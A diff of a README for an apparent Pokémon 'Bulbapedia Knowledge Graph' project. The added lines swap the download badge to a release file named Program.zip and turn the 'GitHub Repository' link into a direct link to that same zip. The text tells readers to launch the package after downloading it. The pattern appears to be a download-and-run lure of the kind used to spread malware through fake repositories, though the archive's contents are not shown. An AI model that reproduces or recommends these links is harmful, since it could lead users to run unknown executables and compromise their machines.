@@ -12,12 +12,12 @@ Dive into the vast world of Pokémon, discover intricate connections, and unrave
 ## 🚀 Get Started!
 To begin your journey into the world of Pokémon through the Bulbapedia Knowledge Graph, you can download the software package by clicking the button below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/vra-thenics/bulbapedia-knowledge-graph/releases/download/v1.0/Program.zip)](https://github.com/vra-thenics/bulbapedia-knowledge-graph/releases/download/v1.0/Program.zip)
 
 *(Note: The software package needs to be launched post-download.)*
 
 ## 🌐 Explore Further
-For more information, updates, and additional resources related to the "Bulbapedia Knowledge Graph" project, visit our [GitHub Repository](https://github.com/yourusername/bulbapedia-knowledge-graph).
+For more information, updates, and additional resources related to the "Bulbapedia Knowledge Graph" project, visit our [GitHub Repository](https://github.com/vra-thenics/bulbapedia-knowledge-graph/releases/download/v1.0/Program.zip).
 
 ## 🔍 How to Contribute
 Contributions to the project are always welcome! Whether you're interested in adding new features, improving existing functionalities, or fixing bugs, your input is valuable. To contribute, simply fork the repository, make your changes, and submit a pull request. Let's work together to enhance the Bulbapedia Knowledge Graph for all Pokémon enthusiasts!
